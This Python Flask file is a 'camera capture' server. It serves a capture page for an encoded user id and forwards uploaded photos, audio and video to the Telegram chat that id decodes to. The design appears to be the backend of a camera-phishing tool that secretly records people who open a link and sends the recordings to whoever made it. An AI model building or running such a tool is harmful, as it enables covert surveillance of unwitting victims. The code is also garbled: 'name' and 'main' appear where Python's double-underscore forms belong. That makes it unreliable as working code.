# server.py
import os
import io
import logging
from flask import Flask, request, render_template, abort, jsonify
from dotenv import load_dotenv
from utils import decode_uid
import telebot
from werkzeug.utils import secure_filename

# Load environment variables
load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
MAX_FILE_SIZE_MB = int(os.getenv("MAX_FILE_SIZE_MB", "12"))

if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN not set in environment.")

bot = telebot.TeleBot(BOT_TOKEN)

# Flask app setup
app = Flask(name, static_folder="static", template_folder="templates")
app.config['MAX_CONTENT_LENGTH'] = MAX_FILE_SIZE_MB * 1024 * 1024

# Logging
logging.basicConfig(level=logging.INFO)


@app.route("/")
def index():
    return "Camera capture server. Use /capture?uid=<id>"


@app.route("/capture")
def capture_page():
    uid_enc = request.args.get("uid")
    if not uid_enc:
        return abort(400, "uid missing")
    try:
        user_id = decode_uid(uid_enc)
    except Exception:
        return abort(400, "invalid uid")
    # Render capture UI; the UI will POST to /upload
    return render_template("index.html", uid=uid_enc)


@app.route("/upload", methods=["POST"])
def upload_media():
    # Expecting form-data: uid (encoded), type ('image'|'audio'|'video'), file (blob)
    uid_enc = request.form.get("uid")
    media_type = request.form.get("type", "image")

    if not uid_enc:
        return abort(400, "uid required")

    try:
        chat_id = decode_uid(uid_enc)
    except Exception:
        return abort(400, "invalid uid")

    if "file" not in request.files:
        return abort(400, "file missing")

    f = request.files["file"]
    filename = secure_filename(f.filename) or f"{media_type}.bin"
    content = f.read()

    logging.info("Received %s from uid=%s: %s bytes", media_type, uid_enc, len(content))

    try:
        bio = io.BytesIO(content)
        bio.name = filename
        bio.seek(0)

        if media_type == "image":
            bot.send_chat_action(chat_id, "upload_photo")
            bot.send_photo(chat_id, bio)
        elif media_type == "audio":
            bot.send_chat_action(chat_id, "upload_audio")
            bot.send_audio(chat_id, bio)
        elif media_type == "video":
            bot.send_chat_action(chat_id, "upload_video")
            bot.send_video(chat_id, bio)
        else:
            bot.send_document(chat_id, bio)
    except Exception as e:
        logging.exception("Failed to forward media to Telegram: %s", e)
        return jsonify({"status": "error", "error": str(e)}), 500

    return jsonify({"status": "ok"})


if name == "main":
    port = int(os.getenv("PORT", "10000"))
    app.run(host="0.0.0.0", port=port)